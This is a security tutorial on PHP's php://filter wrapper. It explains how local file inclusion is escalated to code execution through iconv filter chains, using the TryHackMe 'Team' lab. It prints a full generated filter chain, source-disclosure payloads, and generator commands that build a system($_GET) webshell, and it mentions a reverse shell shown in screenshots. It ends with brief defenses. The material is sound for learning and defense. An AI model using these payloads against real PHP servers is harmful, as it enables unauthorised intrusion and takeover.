# Article — php://filter in depth

## 1. Introduction

In this article I'll break down the LFI -> RCE vulnerability that arises from the PHP `php://filter` wrapper.

What's inside: reading source code through the wrapper -> arbitrary code execution (filter chains) even when `allow_url_include=Off` (the php.ini default!). The last point is the key difference from `data://` and `php://input`, which both require `allow_url_include` to be enabled. The walkthrough material is the Team (THM) lab.

**The key caveat: it matters which function receives the path.** The wrapper itself works with any filesystem API — reading, base64-encode and the encoding filters all work through `file_get_contents` too. But the RCE part (filter chains) requires a function from the **include** family (`include` / `require`): only those execute the stream's contents as PHP.

The variant that works all the way to RCE — the include family, and the scheme sits at the very start of the final string:

```php
$payload = $_GET['img'];

include($payload);
```

And here are two different failure scenarios. First: the read family does not execute the contents — no RCE, but reading/encoding through `php://filter` still works:

```php
$payload = $_GET['img'];

file_get_contents($payload);
```

Second: the wrapper doesn't work at all, not even for reading — the final string becomes `images/php://filter/...`, and PHP only recognizes a scheme at the beginning of the string:

```php
$payload = $_GET['img'];

include('images/' . $payload);
```

The last case is insidious precisely because of its **silent failure**: an empty response with zero errors means "the scheme was never recognized", not "the wrapper is blocked by config". If the user input never starts the final string, php://-techniques are dead on that endpoint entirely.

Summary: two conditions for RCE via `php://filter` — **(1) an include-family function, (2) the input value starts the final string**. Everything else — encodings, URL length — are details covered later in the article.


## 2. How php://filter works

`php://filter` is a stream wrapper that lets you apply filters to a stream while it is being opened. It was designed for the generic file functions like `readfile()`, `file()`, `file_get_contents()`, where there is otherwise no way to apply a filter to the stream before its contents are read.

The filter list is embedded in the URI itself and separated by the vertical bar (`|`). A single URI can carry any number of filters — they are applied **sequentially, left to right**: the output of each filter becomes the input of the next. This is a fundamental fact for the filter chains in §4.

Parameters of `php://filter`:
- `resource=<stream to filter>` — required. Specifies the stream to filter. Important: this doesn't have to be a file on disk — you can pass any other wrapper in there: `compress.zlib://...`, `http://...`, `zip://...`.
- `read=<filter list for the read chain>` — optional. One or more filter names separated by `|`.
- `write=<filter list for the write chain>` — optional. Same idea.
- `<filter list without a prefix>` — any filter list without `read=` or `write=` is applied to both chains at once.

Examples from the official documentation (both use the `read=` prefix):

- This script outputs the contents of the `www.example.com` resource entirely in uppercase:

  ```php
  readfile("php://filter/read=string.toupper/resource=http://www.example.com");
  ```

- This script does the same, but also encodes the data with ROT13:

  ```php
  readfile("php://filter/read=string.toupper|string.rot13/resource=http://www.example.com");
  ```

In an LFI context the `read=` prefix is usually dropped — unprefixed filters apply to both chains at once, and the payload comes out shorter and more readable:

```php
readfile("php://filter/convert.base64-encode/resource=config.php");
```


## 3. Reading and encoding

The `php://` wrapper is compiled into PHP itself — it cannot be disabled through ini settings, and it works with any filesystem API.

**Reading source code.** `include config.php` returns the result of execution, not the code. `convert.base64-encode` strips the `<?php` tag out of the stream before it is read — there is nothing left to execute, so the base64 comes out as plain text:

```http
?page=php://filter/convert.base64-encode/resource=config
```

Decode it locally (`echo '<b64>' | base64 -d`): credentials, file names, the code of the vulnerable endpoint itself (include vs read — it decides everything). Watch the appended extension: `resource=config` + the appended `.php` = `config.php`.


**Filters for reading:**

| Filter                                    | Use case                                                                                                                                                         |
| ----------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `convert.base64-encode/decode`            | transporting source code and binaries; stacking them defeats signature-based output filters (`...base64-encode\|convert.base64-encode...`, decode twice locally) |
| `convert.quoted-printable-encode/decode`  | URL-friendly alternative to base64                                                                                                                               |
| `string.rot13`                            | `<?php` → `<?cuc`: include loses the opening tag and prints the source as text; decode locally with `tr 'A-Za-z' 'N-ZA-Mn-za-m'`. Shorter payload than base64    |
| `compress.zlib://` (wrapper)              | rotated `access.log-*.gz` logs, decompressed on the fly                                                                                                          |
| `zlib.inflate` / `zlib.deflate` (filters) | raw deflate streams; `zlib.deflate\|convert.base64-encode` — economical reading of large logs                                                                    |

Filters chain in any order — the output of each becomes the input of the next (the foundation for §4).

---

Transition: everything above transforms content that already exists. From here on, the filters work with *nothing* for the first time: from an empty stream — sculpt an arbitrary payload.

## 4. The iconv vulnerability in PHP filters

The `php://filter` wrapper applies a chain of filters to the stream — among them conversion filters: `convert.iconv.*` (charset conversion) and `convert.base64-encode/decode`. Every filter in the chain transforms the bytes passing through it.

The key trick is picking `convert.iconv` charset pairs so that bytes multiply or change in a predictable way at every step — exploiting how iconv handles invalid or multi-byte sequences. By chaining hundreds of such filters together you can gradually, byte by byte, sculpt an arbitrary string out of the initial garbage — effectively constructing data byte-wise right inside the stream, without ever touching the disk.

Once the desired string is ready (PHP code, for example), it's handed to `include()` — PHP executes the stream's contents as code.

### 4.1 The principle behind generating such a string

The principle of generating a byte is pure charset mechanics. It all starts with one arbitrary input byte (often an empty string, or a pre-computed chain like `convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|...` that produces some starting byte out of garbage input). From there you work with charset pairs in `convert.iconv.FROM.TO`.

The idea: pick two charsets where the same byte represents different characters — and when converting between certain charsets, iconv replaces a mismatched or multi-byte character with a fallback character or several bytes in a row — meaning one input byte becomes two identical output bytes.

Having doubled the byte, apply `convert.iconv` with a different charset pair where these two repeated bytes collapse back into one — but with a different value. In practice this is a way to add or subtract a constant from a byte's value by picking the right charset pair. Repeating this many times amounts to bit-level arithmetic: shifting the byte's value left or right.

Once the desired byte is produced, it is locked in (`convert.base64-decode|convert.base64-encode`, the "cleanup" step) and the process repeats for the next character of the string. In the end you get an arbitrary string assembled entirely out of this charset arithmetic.

If that string then goes into `include()` on the server, PHP interprets it as code.

### 4.2 Generating an arbitrary stream → RCE

The essence of the mechanism: `php://filter` lets you build a chain of conversion filters — the `|` character simply connects them one after another.

Here is an excerpt of the dictionary from `php_filter_chain_generator.py` — charset pairs that produce a given character are pre-enumerated and mapped to every base64 character. For each character of the target string's base64 representation the tool takes a ready-made block from the dictionary and glues the blocks together one after another. At the very end of the whole construction sits `convert.base64-decode`, which turns the character-by-character assembled gibberish back into clean PHP code, and that code is executed through `include` — hence the RCE.

```python
conversions = {
    'C': 'convert.iconv.UTF8.CSISO2022KR',
    'Q': 'convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500-1983.UCS-2BE|convert.iconv.MIK.UCS2',
    'M': 'convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.iconv.UTF16BE.866|convert.iconv.MACUKRAINIAN.WCHAR_T',
    # ... 64 entries in total — one for every base64 character
}
```


The generator automates all of it: [php_filter_chain_generator](https://github.com/synacktiv/php_filter_chain_generator) (Synacktiv). The shorter the payload, the shorter the chain; the skeleton and the final decode are identical for every chain.

#### Walkthrough: Team (THM) — LFI → RCE

Only the filter part here.

LFI: the subdomain `dev.team.thm`, a page renders `<a href=script.php?page=teamshare.php>`. Fuzzing with LFI-Jhaddix confirms arbitrary reading (`/etc/passwd`, `/etc/apache2/apache2.conf` are readable). `script.php` executes what it includes — include-family, the conditions from the introduction are met: the input value starts the final string.

`allow_url_include` on Team is Off (Ubuntu default). `data://` and `php://input` are dead, but filter chains don't care — php:// is not checked by this directive. Verification:

```sh
python3 php_filter_chain_generator.py --chain '<?php phpinfo() ?>'
php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16|convert.iconv.WINDOWS-1258.UTF32LE|convert.iconv.ISIRI3342.ISO-IR-157|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM891.CSUNICODE|convert.iconv.ISO8859-14.ISO6937|convert.iconv.BIG-FIVE.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.CP1163.CSA_T500|convert.iconv.UCS-2.MSCP949|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp
```

![[Articles/LFI Articles/Article 2/Screenshot_20261112_191036.png]]

A webshell — straight through `$_GET[0]` (a numeric key: untouched by filters, doesn't collide with the `page` parameter):

```sh
python3 php_filter_chain_generator.py --chain '<?php system($_GET["c"]);?>'
```

![[Articles/LFI Articles/Article 2/Screenshot_20261112_191413.png]]

Or a reverse shell right away (same mechanism, a bash reverse shell inside):

![[Articles/LFI Articles/Article 2/Screenshot_20261112_191828.png]]

An important practical detail: the chain contains `+` and `/`. In a GET request `+` decodes into a **space** — an unencoded chain silently breaks. URL-encode the entire chain before sending:

![[Articles/LFI Articles/Article 2/Screenshot_20261112_191844.png]]

Firing it:

![[Articles/LFI Articles/Article 2/Screenshot_20261112_191900.png]]

The result — a reverse shell as www-data:

![[Articles/LFI Articles/Article 2/Screenshot_20261112_191947.png]]

### 4.3 Limitations

- **The include family is mandatory.** `file_get_contents($chain)` returns the payload as text — it reads it, doesn't execute it.
- **URL length.** A chain for a short payload is already thousands of characters; a long reverse shell generates a string in the tens of kilobytes. Servers cut URLs at their limits — keep the payload minimal (`<?= system($_GET[0]);?>`) and deliver the reverse shell itself with a second request.
- **URL-encoding of `+`.** Every `+` in the chain is a future space if left unencoded (see the walkthrough above).
- **The garbage tail.** The seed's bytes follow the payload in the stream. For include this doesn't matter (a valid `<?php ... ?>` executes, the tail is printed as text), but keep it in mind for non-standard use cases — sometimes padding the payload with spaces helps.
- **No configuration needed.** `allow_url_include`, `allow_url_fopen` — irrelevant; php:// is compiled in and cannot be disabled by ini. The only real condition is an include-family function executing the stream.

### 4.4 Defenses

Protection comes down, first and foremost, to eliminating the LFI itself: never pass user input directly into `include`/`require`, use file whitelists. Additionally, watch for anomalously long `php://filter/...` paths in the logs — such a chain almost always looks like hundreds of repeating segments, which WAF rules or IDS signatures catch well.
